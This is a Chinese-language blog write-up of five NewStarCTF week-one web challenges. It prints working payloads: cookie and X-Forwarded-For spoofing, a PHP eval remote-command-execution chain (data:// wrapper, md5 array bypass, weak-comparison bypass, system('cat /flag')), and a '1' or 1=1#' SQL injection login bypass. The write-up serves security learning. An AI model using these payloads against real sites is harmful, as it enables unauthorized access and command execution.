---
title: NewStarCTF WEEK1 WEB
date: 2022-10-07 21:54:12
excerpt: NewStarCTF WEEK1 WEB
categories: 复现
---



# 1.HTTP

![图片-1665405504740](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161655204.png)

进入题目发现要get name，我们猜测要用get的提交数据方式传一个值

get传值公式为

**?+变量名+等于号（=）+变量值**

题目中的“name”添加了单引号，猜测变量名为name传入

?name=1

![图片-1665405531405](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161655983.png)

进入第二关，需要我们post一个key值，但我们不知道key

F12进入开发者模式，html中藏了key值

![图片-1665405550865](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161655026.png)

用post传参key=ctfisgood（post传参不会显示到url上面，并且并不需要用问号（？）

![图片-1665405558353](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161655803.png)

用bp传入key=ctfisgood后，发现response说我们不是admin，

我们看到cookie中显示user=guest，改为user=admin



得到flag{ed52ca0c-40c7-4c7e-bfd7-d4f2cbbd2435}

# 2.Head?Header!

![图片-1665405589688](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161656086.png)

这里要我们将浏览器改为CTF，我们用bp抓一个包

![图片-1665405599681](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161656618.png)

必须要求我们来自‘ctf.com'，这里用到了referer的知识点

> Referer  是  HTTP  请求header 的一部分，当浏览器（或者模拟浏览器行为）向web 服务器发送请求的时候，头信息里有包含  Referer  。比如我在www.google.com 里有一个www.baidu.com 链接，那么点击这个www.baidu.com ，它的header 信息里就有：
>
> ```
> Referer=http://www.google.com
> ```
>
> 由此可以看出来吧。它就是表示一个来源。看下图的一个请求的 Referer  信息。

[referer知识点](https://blog.csdn.net/shenqueying/article/details/79426884)

我们加一行

**referer:ctf.com**

![图片-1665405614966](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161656077.png)

这里提示我们不是local，在php中有很多头能改来源常见的是X-Forward-For

[X-Forwarded-For知识点](https://www.jianshu.com/p/15f3498a7fad)

我们添加一行

**X-Fordward-For:127.0.0.1**

127.0.0.1就是本地地址

![图片-1665405624087](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161656892.png)

得到flag{d0637815-c4fc-4aa4-a842-06ebfc22817b}

# 3.我真的会谢

![图片-1665405631706](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161657077.png)

flag放在三个地方，都是敏感文件

一般常见的有

robots.txt .index.php.swp www.zip index.php~ 还有很多可以自行查询

题目这里是robots.txt .index.php.swp www.zip

![图片-1665405645261](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161657703.png)

![图片-1665405650443](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161657351.png)
![图片-1665405656120](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161657336.png)

得到flag

正常情况下我们用dirsearch就可以扫出来，不过buu这里不支持

# 4.NotPHP

```php
 <?php
error_reporting(0);
highlight_file(__FILE__);
if(file_get_contents($_GET['data']) == "Welcome to CTF"){
    if(md5($_GET['key1']) === md5($_GET['key2']) && $_GET['key1'] !== $_GET['key2']){
        if(!is_numeric($_POST['num']) && intval($_POST['num']) == 2077){
            echo "Hack Me";
            eval("#".$_GET['cmd']);
        }else{
            die("Number error!");
        }
    }else{
        die("Wrong Key!");
    }
}else{
    die("Pass it!");
} Pass it!
```

是一道php代码审计题目一共有四关

第一关

```php
if(file_get_contents($_GET['data']) == "Welcome to CTF")
```

这里给出相关知识点[file_get_contents相关知识点](https://blog.csdn.net/qq_45290991/article/details/113852174)

[php伪协议](https://www.cnblogs.com/linfangnan/p/13535097.html)

这里我们用data协议写入

```php
?data=data://text/plain,Welcome to CTF
```

接着第二关

```php
要求我们if(md5($_GET['key1']) === md5($_GET['key2']) && $_GET['key1'] !== $_GET['key2'])
```

这里要求key1和key2的md5值相同但key1和key2不相等，乍一看觉得很奇怪，但其实md5可以绕过

[md5绕过](https://bbs.huaweicloud.com/blogs/319030#:~:text=%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87%20md5%E4%B8%8D%E8%83%BD%E5%8A%A0%E5%AF%86%E6%95%B0%E7%BB%84%2C%E4%BC%A0%E5%85%A5%E6%95%B0%E7%BB%84%E4%BC%9A%E6%8A%A5%E9%94%99%2C%E4%BD%86%E4%BC%9A%E7%BB%A7%E7%BB%AD%E6%89%A7%E8%A1%8C%E5%B9%B6%E4%B8%94%E8%BF%94%E5%9B%9E%E7%BB%93%E6%9E%9C%E4%B8%BAnull%20%E6%AF%94%E5%A6%82%E5%B0%86%E4%B8%A4%E4%B8%AA%E6%95%B0%E7%BB%84%E7%9A%84md5%E5%80%BC%E8%BF%9B%E8%A1%8C%E6%AF%94%E8%BE%83,md5%28a%5B%5D%3D1%29%20%3D%3D%3D%20md5%28b%5B%5D%3D1%29%20%E7%94%B1%E4%BA%8Emd5%E5%87%BD%E6%95%B0%E6%97%A0%E6%B3%95%E5%A4%84%E7%90%86%E6%95%B0%E7%BB%84%2C%E4%BC%9A%E8%BF%94%E5%9B%9Enull%2C%E6%89%80%E4%BB%A5md5%E5%8A%A0%E5%AF%86%E5%90%8E%E7%9A%84%E7%BB%93%E6%9E%9C%E6%98%AF%E4%B8%8B%E9%9D%A2%E8%BF%99%E6%A0%B7)

当我们让key1和key2为数组的时候，md5加密后，结果均为0，则0===0成立

```php
key1[]=1&key2[]=2
```

第三关

```php
if(!is_numeric($_POST['num']) && intval($_POST['num']) == 2077)
```

is_numeric函数用来判断是否为数字

intval() 函数用于获取变量的整数值。

这里我们需要让num不是数字但让num=2077，这里需要注意这里用到的是==

这是弱类型比较，则我们传入num=2077a

```php
num=2077a
```

intval(2077a)=2077可以在自己实验一下

第四关

```php
eval("#".$_GET['cmd']);
```

简单的rce，难点在于这个#注释

有两种绕过方式

1.?>让前面闭合

2.%0a用换行来绕过

经测试发现空格被过滤 我这利用%20绕过，还有许多绕过方式，自行搜索

```php
&cmd=%0asystem('cat%20/flag');
```

```php
&cmd=?><?system('cat%20/flag');
```

得到flag{cd5e5ad9-1861-4bda-bcd5-bc729f7f953c}

# 5.Word-For-You

![图片-1665405676352](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161657645.png)

看着像sql注入猜一波万能密码

```
1' or 1=1#
```

![图片-1665405683499](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161657484.png)

直接出，这里给一个sql注入学习链接

[sql注入](https://blog.csdn.net/yujia_666/article/details/90296495?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522166429318116782427488623%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=166429318116782427488623&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-90296495-null-null.142^v50^pc_rank_34_1,201^v3^add_ask&utm_term=sql%E6%B3%A8%E5%85%A5&spm=1018.2226.3001.4187)

<br/>

<br/>

第一周做完了，题目还算比较简单，这段时间充实下自己吧